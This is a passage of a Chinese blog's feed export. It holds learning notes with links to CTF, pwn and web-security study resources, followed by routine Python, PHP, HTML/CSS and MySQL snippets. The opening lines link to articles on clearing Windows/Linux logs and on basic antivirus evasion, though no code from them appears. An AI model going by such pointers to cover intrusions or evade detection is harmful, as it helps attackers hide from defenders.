href="https://www.const27.com/2021/09/03/windows&linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/">windows日志</a></p><br/><br/><p><strong>基础免杀手法暴风吸入：</strong></p><p>链接：<a href="https://www.const27.com/2021/09/03/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80%E6%89%8B%E6%B3%95%E6%9A%B4%E9%A3%8E%E5%90%B8%E5%85%A5/">免杀</a></p><p><strong>some blogs：</strong></p><p>链接：<a href="https://www.const27.com/">https://www.const27.com/</a></p><p>哈哈哈，一篇比较有意思的博客：<a href="https://lanyundev.vercel.app/posts/41390.html#7-%E7%94%A8N%E5%B1%82%E7%A7%81%E4%BA%BA%EF%BC%88%E5%85%B1%E7%94%A8%EF%BC%89VPN%E5%90%8E%E5%88%A0%E6%8E%89VPN%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%8F%91%E5%B8%96%E4%BA%BA%E6%97%A0QQ">浅谈网警抓人全过程 (即使有 VPN) | LanYun の Blog (lanyundev.vercel.app)</a></p><br/><br/>]]></content>
    
    
    <summary type="html">xy对pwn的一点理解</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>笔记</title>
    <link href="http://xiaoxiaoxy1.github.io/2022/02/09/%E7%AC%94%E8%AE%B0/"/>
    <id>http://xiaoxiaoxy1.github.io/2022/02/09/%E7%AC%94%E8%AE%B0/</id>
    <published>2022-02-09T12:16:14.000Z</published>
    <updated>2022-05-19T16:33:19.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB-荐"><a href="#WEB-荐" class="headerlink" title="WEB(荐)"></a>WEB(荐)</h1><p><strong>学习资料：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接1：<a href="https://mp.weixin.qq.com/s/vKmmGzh_i6QbBR_xPUtk_A">https://mp.weixin.qq.com/s/vKmmGzh_i6QbBR_xPUtk_A</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注：微信公众号（三叶草小组Syclover），有兴趣的可以关注一下</p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接2：<a href="https://mp.weixin.qq.com/s/4MeV5XFFJ4Q67bNmJNfseA">https://mp.weixin.qq.com/s/4MeV5XFFJ4Q67bNmJNfseA</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接3（逆向）：<a href="https://mp.weixin.qq.com/s/tBCy3zegkWN_PkKIGTORvA">https://mp.weixin.qq.com/s/tBCy3zegkWN_PkKIGTORvA</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接4（pwn）：<a href="https://mp.weixin.qq.com/s/GDso2Y_cYwV5iOSGWAmICA">https://mp.weixin.qq.com/s/GDso2Y_cYwV5iOSGWAmICA</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接5（web）：<a href="https://mp.weixin.qq.com/s/8a7kHZlwZRtOCkEwLEYqrQ">https://mp.weixin.qq.com/s/8a7kHZlwZRtOCkEwLEYqrQ</a></p><br/><p>&nbsp;&nbsp;&nbsp;&nbsp;链接1里的一句话：<strong>当然我的意思不是必须学完这些所有基础才能进一步学习安全，很多时候都是在研究具体某个安全问题的时候才会临时去学习相关的知识。</strong></p><br/><br/><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><p><strong>学习资料：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://ctf-wiki.org/">简介 - CTF Wiki (ctf-wiki.org)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="http://pwnable.kr/">pwnable.kr</a></p><br/><br/><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><p>1、代码中存在中文时报错：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SyntaxError: Non-ASCII character <span class="string">&#x27;\xe8&#x27;</span> <span class="keyword">in</span> file D:/PyCharmProject/TempConvert.py on line <span class="number">2</span>, but no encoding declared; see http://python.org/dev/peps/pep-0263/ <span class="keyword">for</span> details</span><br></pre></td></tr></table></figure><p>原因：注释里面出现了中文，而 Python 支持的 ASCII 码无中文。</p><br/><p>2、python3与python2中print的区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">区别： Python2中 的 print 是一个关键字，而 Python3 里的 print 是一个 函数 。 关键字用法“ print 要打印的内容”； 函数 用法“ print (要打印的内容)”。 总地来说， Python2.7的 print 不是一个function，而 Python3 里的 print 是一个function。</span><br></pre></td></tr></table></figure><br/><p>解决方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这样也行</span></span><br><span class="line"><span class="comment"># coding:utf-8 </span></span><br></pre></td></tr></table></figure><p>注意：本行要添加在源代码的第一行</p><br/><br/><h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式 – 语法 | 菜鸟教程 (runoob.com)</a></p><br/><br/><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p><strong>phpstorm：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注：不想选择评估免费版本的话，安装好后不要动，先去淘宝买激活码（附带激活教程）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（很多软件都可以通过淘宝买激活码的方式获取专业版使用权限。白嫖党请自行去寻找资源）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接（基本教程）：<a href="https://zhuanlan.zhihu.com/p/112353790">PhpStorm的使用教程（本地运行PHP+远程开发+快捷键） - 知乎 (zhihu.com)</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接（汉化教程）：<a href="https://blog.csdn.net/weixin_46397725/article/details/107443128">https://blog.csdn.net/weixin_46397725/article/details/107443128</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接（进阶教程）：<a href="https://blog.csdn.net/fangkang7/article/details/112383620">https://blog.csdn.net/fangkang7/article/details/112383620</a></p><p>注：若找不到php.exe文件，请下载 wampserver 教程如下：↓</p><br/><p><strong>wampserver：</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://blog.csdn.net/ba_qi/article/details/102736014">wampserver下载安装使用教程_空心人的博客-CSDN博客_wampserver</a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;链接：<a href="https://www.cnblogs.com/InfoStudio/p/6242073.html">PhpStorm和WAMP配置调试参数，问题描述Error. Interpreter is not specified or invalid. Press “Fix” to edit your project configuration. - 易几 - 博客园 (cnblogs.com)</a></p><br/><p>效果图如下：</p><p><img src="image-20220209205600804.png" alt="image-20220209205600804"></p><p><br/><br/></p><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">词条收录：</span><br><span class="line">HTML &lt;link&gt; 标签</span><br></pre></td></tr></table></figure><br/><p>解决乱码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;/&gt;</span><br><span class="line">or</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=GBK&quot;/&gt;</span><br></pre></td></tr></table></figure><p>根据具体情况在自己的代码中选择一句进行添加</p><p><img src="image-20220210173002721.png" alt="image-20220210173002721"></p><br/><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span>标签disabled属性：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;lname&quot;</span> <span class="attr">disabled</span>=<span class="string">&quot;disabled&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">下拉框默认选中(selected)：</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span>大专<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>&gt;</span>本科<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span>&gt;</span>硕士<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span>&gt;</span>默认选中(checked)：</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;state&quot;</span> <span class="attr">checked</span>/&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;male&quot;</span>&gt;</span>未婚<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;state&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;female&quot;</span>&gt;</span>已婚<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;state&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;secret&quot;</span>&gt;</span>保密<span class="tag">&lt;/<span class="name">lable</span>&gt;</span></span><br><span class="line"></span><br><span class="line">下拉框：</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">  例：</span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;city&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;fuzhou&quot;</span>&gt;</span>福州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;xiamen&quot;</span>&gt;</span>厦门市<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;quanzhou&quot;</span>&gt;</span>泉州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;zhangzhou&quot;</span>&gt;</span>漳州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">link 标签中“rel=stylesheet”的作用：</span><br><span class="line">rel各个属性值配置的意思：</span><br><span class="line">      Alternate -- 定义交替出现的链接 </span><br><span class="line">  **  Stylesheet -- 定义一个外部加载的样式表 </span><br><span class="line">      Start -- 通知搜索引擎,文档的开始 </span><br><span class="line">      Next -- 记录文档的下一页.(浏览器可以提前加载此页) </span><br><span class="line">      Prev -- 记录文档的上一页.(定义浏览器的后退键) </span><br><span class="line">      Contents </span><br><span class="line">      Index -- 当前文档的索引 </span><br><span class="line">      Glossary -- 词汇 </span><br><span class="line">      Copyright -- 当前文档的版权 </span><br><span class="line">      Chapter -- 当前文档的章节 </span><br><span class="line">      Section -- 作为文档的一部分 </span><br><span class="line">      Subsection -- 作为文档的一小部分 </span><br><span class="line">      Appendix -- 定义文档的附加信息 </span><br><span class="line">      Help -- 链接帮助信息 </span><br><span class="line">      Bookmark -- 书签 </span><br><span class="line"></span><br><span class="line">我们用这样的方式<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;css/bootstrap.css&quot;</span>&gt;</span>，</span><br><span class="line">引入外部的css文件时，一定不能忘记rel属性的配置。</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">词条收录：</span><br><span class="line">CSS border-style 属性</span><br><span class="line">CSS display 属性</span><br><span class="line">CSS position 属性</span><br><span class="line">CSS border-bottom 属性</span><br></pre></td></tr></table></figure><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">例：</span><br><span class="line">.search-index &#123;</span><br><span class="line">    display: flex;        #灵活布局</span><br><span class="line">    position: fixed;</span><br><span class="line">    height: 44px;</span><br><span class="line">    width: 100%;</span><br><span class="line">    max-width: 540px;</span><br><span class="line">    min-width: 320px;</span><br><span class="line">    background-color: #F6F6F6;</span><br><span class="line">    border-top: 1px solid #ccc;</span><br><span class="line">    border-bottom: 1px solid #ccc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>position: fixed会导致顶部搜索栏固定，即使滚轮移动也会使搜索栏在最顶部不动</p><p><img src="image-20220309095915969.png" alt="image-20220309095915969"></p><br/><br/><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>学习链接：</strong><a href="https://www.lanqiao.cn/courses/9">MySQL 基础课程_MySQL - 蓝桥云课 (lanqiao.cn)</a></p><br/><h2 id="MySQL安装："><a href="#MySQL安装：" class="headerlink" title="MySQL安装："></a>MySQL安装：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysql start             <span class="comment">#检查Linux系统中是否已安装MySQL</span></span><br><span class="line">sudo apt-get install mysql-server    <span class="comment">#安装 MySQL 服务端、核心程序</span></span><br><span class="line">sudo apt-get install mysql-client    <span class="comment">#安装 MySQL 客户端</span></span><br><span class="line">sudo netstat -tap | grep mysql       <span class="comment">#检查是否安装成功</span></span><br><span class="line">sudo gedit /etc/mysql/my.cnf         <span class="comment">#修改 MySQL 的配置文件</span></span><br></pre></td></tr></table></figure><br/><h2 id="MySQL使用："><a href="#MySQL使用：" class="headerlink" title="MySQL使用："></a>MySQL使用：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#windows下</span><br><span class="line">#net start mysql 启动 mysql 服务</span><br><span class="line">#net stop mysql 关闭 mysql 服务</span><br><span class="line"></span><br><span class="line">mysql -hlocalhost -uroot -proot #进入mysql数据库，其中-h表示服务器名，localhost表示本地；</span><br><span class="line"></span><br><span class="line">&gt;&gt; mysql -hlocalhost -uroot -p321qwe</span><br><span class="line"></span><br><span class="line">#-u为数据库用户名，root是mysql默认用户名；-p为密码，如果设置了密码，可直接在-p后直接输入。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#linux</span><br><span class="line">sudo service mysql start        #linux下启动 MySQL 服务</span><br><span class="line">mysql -u root                   #使用 root 用户登录，实验楼环境的密码为空，直接回车就可以登录</span><br><span class="line"></span><br><span class="line">数据库：</span><br><span class="line">show databases;                 #查看数据库</span><br><span class="line">CREATE DATABASE &lt;数据库名&gt;;      #创建数据库，大部分情况SQL语句不区分大小写</span><br><span class="line">use &lt;数据库名&gt;;                  #连接/进入数据库</span><br><span class="line">DROP DATABASE &lt;数据库名&gt;;        #删除数据库</span><br><span class="line"></span><br><span class="line">表：</span><br><span class="line">show tables;                    #查看表</span><br><span class="line">SELECT * FROM &lt;表名&gt;;            #查看表中的所有内容</span><br><span class="line">CREATE TABLE &lt;表名&gt;              #新建表</span><br><span class="line">(</span><br><span class="line">    列名a 数据类型(数据长度),</span><br><span class="line">    列名b 数据类型(数据长度),</span><br><span class="line">    列名c 数据类型(数据长度)</span><br><span class="line">);</span><br><span class="line">#例：CREATE TABLE employee (id int(10),name char(20),phone int(12));</span><br><span class="line"></span><br><span class="line">INSERT INTO &lt;表名&gt;(列名a,列名b,列名c) VALUES(值1,值2,值3);    #向表中插入数据</span><br><span class="line">RENAME TABLE 原名 TO 新名字;      #重命名表</span><br><span class="line">DROP TABLE &lt;表名&gt;;               #删除表</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">quit (or) exit                  #退出</span><br><span class="line">source xxx.sql                  #加载.sql文件中的SQL语句</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">增：</span><br><span class="line">ALTER TABLE 表名字 ADD COLUMN 列名字 数据类型 约束;  #表中增加一列</span><br><span class="line">ALTER TABLE 表名字 ADD 列名字 数据类型 约束;         #表中增加一列</span><br><span class="line">DEFAULT、AFTER、 FIRST 关键字：</span><br><span class="line">ALTER TABLE employee ADD height INT(4) DEFAULT 170;            #末尾增加一列</span><br><span class="line">ALTER TABLE employee ADD weight INT(4) DEFAULT 120 AFTER age;  #age列后增加一列</span><br><span class="line">ALTER TABLE employee ADD test INT(10) DEFAULT 11 FIRST;        #增加在第一列</span><br><span class="line"></span><br><span class="line">删：</span><br><span class="line">DROP DATABASE &lt;数据库名&gt;;</span><br><span class="line">DROP TABLE &lt;表名&gt;;</span><br><span class="line">ALTER TABLE 表名字 DROP COLUMN 列名字;  #删除指定列</span><br><span class="line">ALTER TABLE 表名字 DROP 列名字;          #删除指定列</span><br><span class="line">DELETE FROM 表名字 WHERE 条件;           #删除一行记录</span><br><span class="line">DELETE FROM employee WHERE name=&#x27;Tom&#x27;;  # ↑ 删除Tom的数据</span><br><span class="line"></span><br><span class="line">改：</span><br><span class="line">RENAME TABLE 原名 TO 新名字;      #重命名表</span><br><span class="line">ALTER TABLE 原名 RENAME 新名;     #重命名表</span><br><span class="line">ALTER TABLE 原名 RENAME TO 新名;  #重命名表</span><br><span class="line">ALTER TABLE 表名字 CHANGE 原列名 新列名 数据类型 约束;  #重命名列</span><br><span class="line">ALTER TABLE 表名字 MODIFY 列名字 新数据类型;          #改变数据类型</span><br><span class="line">UPDATE 表名字 SET 列1=值1,列2=值2 WHERE 条件;        #修改表中某个值 ，注：一定要有 WHERE 条件</span><br><span class="line">update 表名 set 字段名=‘新内容’  where 条件;</span><br><span class="line"># https://blog.csdn.net/qq_42254088/article/details/81705274</span><br><span class="line"></span><br><span class="line">查：</span><br><span class="line">SELECT 要查询的列名 FROM 表名字 WHERE 限制条件;     #select语句基本格式</span><br><span class="line">SELECT * FROM &lt;表名&gt;;                           #查看表中的所有内容</span><br><span class="line">SELECT name,age FROM employee WHERE age&gt;25;    #WHERE 限制条件</span><br><span class="line">SELECT name,age,phone FROM employee WHERE name=&#x27;Mary&#x27;;</span><br><span class="line"># OR 与 AND</span><br><span class="line">SELECT name,age FROM employee WHERE age&gt;25 AND age&lt;30;  </span><br><span class="line"># IN 与 NOT IN</span><br><span class="line">SELECT name,age,phone,in_dpt FROM employee WHERE in_dpt IN (&#x27;dpt3&#x27;,&#x27;dpt4&#x27;);</span><br><span class="line"># 通配符 _ 与 % ，通常与实现模糊查询的LIKE关键字联用</span><br><span class="line">SELECT name,age,phone FROM employee WHERE phone LIKE &#x27;1101__&#x27;;  #查询6位号码</span><br><span class="line">SELECT name,age,phone FROM employee WHERE name LIKE &#x27;J%&#x27;;       #查询J开头的字符</span><br><span class="line"># ORDER BY 排序关键字，默认为升序，可用 ASC 与 DESC 指定 升序 或 降序</span><br><span class="line">SELECT name,age,salary,phone FROM employee ORDER BY salary DESC;#按表中salary的值排序</span><br><span class="line"></span><br><span class="line"># 内置函数与计算</span><br><span class="line">函数名：COUNTSUM  AVG   MAX  MIN</span><br><span class="line">作用：     计数   求和   求平均值  最大值  最小值</span><br><span class="line">SELECT MAX(salary) AS max_salary,MIN(salary) FROM employee;     #找出最大最小值</span><br><span class="line">##  想要知道名为 &quot;Tom&quot; 的员工所在部门做了几个工程。员工信息储存在 employee 表中，</span><br><span class="line">##  但工程信息储存在 project 表中。  ↓   子查询</span><br><span class="line">SELECT of_dpt,COUNT(proj_name) AS count_project FROM project GROUP BY of_dpt</span><br><span class="line">HAVING of_dpt IN</span><br><span class="line">(SELECT in_dpt FROM employee WHERE name=&#x27;Tom&#x27;);    </span><br><span class="line">##  上面代码包含两个 SELECT 语句，第二个 SELECT 语句将返回一个集合的数据形式，  ↑</span><br><span class="line">##  然后被第一个 SELECT 语句用 in 进行判断。</span><br><span class="line">##  HAVING 关键字可以的作用和 WHERE 是一样的，都是说明接下来要进行条件筛选操作。</span><br><span class="line">##  区别在于 HAVING 用于对分组后的数据进行筛选  </span><br><span class="line"></span><br><span class="line"># 连接查询 ，join</span><br><span class="line">SELECT id,name,people_num</span><br><span class="line">FROM employee,department</span><br><span class="line">WHERE employee.in_dpt = department.dpt_name</span><br><span class="line">ORDER BY id;</span><br><span class="line">##这条语句查询出的是，各员工所在部门的人数，其中员工的 id 和 name 来自 employee 表，</span><br><span class="line">##people_num 来自 department 表：</span><br><span class="line">##另一种格式 ，结果相同  ↓</span><br><span class="line">SELECT id,name,people_num</span><br><span class="line">FROM employee JOIN department</span><br><span class="line">ON employee.in_dpt = department.dpt_name</span><br><span class="line">ORDER BY id;</span><br></pre></td></tr></table></figure><p>Show命令：<a href="https://blog.csdn.net/zztfj/article/details/6181379">https://blog.csdn.net/zztfj/article/details/6181379</a>      ↓  摘录如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1. show tables或show tables from database_name; -- 显示当前数据库中所有表的名称。</span><br><span class="line">2. show databases; -- 显示mysql中所有数据库的名称。 </span><br><span class="line">3. show columns from table_name from database_name; 或show columns from database_name.table_name; -- 显示表中列名称。</span><br><span class="line">4. show grants for user_name; -- 显示一个用户的权限，显示结果类似于grant 命令。</span><br><span class="line">5. show index from table_name; -- 显示表的索引。</span><br><span class="line">6. show status; -- 显示一些系统特定资源的信息，例如，正在运行的线程数量。</span><br><span class="line">7. show variables; -- 显示系统变量的名称和值。</span><br><span class="line">8. show processlist; -- 显示系统中正在运行的所有进程，也就是当前正在执行的查询。大多数用户可以查看他们自己的进程，但是如果他们拥有process权限，就可以查看所有人的进程，包括密码。</span><br><span class="line">9. show table status; -- 显示当前使用或者指定的database中的每个表的信息。信息包括表类型和表的最新更新时间。</span><br><span class="line">10. show privileges; -- 显示服务器所支持的不同权限。</span><br><span class="line">11. show create database database_name; -- 显示create database 语句是否能够创建指定的数据库。</span><br><span class="line">12. show create table table_name; -- 显示create database 语句是否能够创建指定的数据库。</span><br><span class="line">13. show engines; -- 显示安装以后可用的存储引擎和默认引擎。</span><br><span class="line">14. show innodb status; -- 显示innoDB存储引擎的状态。</span><br><span class="line">15. show logs; -- 显示BDB存储引擎的日志。</span><br><span class="line">16. show warnings; -- 显示最后一个执行的语句所产生的错误、警告和通知。</span><br><span class="line">17. show errors; -- 只显示最后一个执行语句所产生的错误。</span><br><span class="line">18. show [storage] engines; --显示安装后的可用存储引擎和默认引擎。</span><br></pre></td></tr></table></figure><br/><h2 id="数据类型"><a href="#数据类型" class="headerlink" 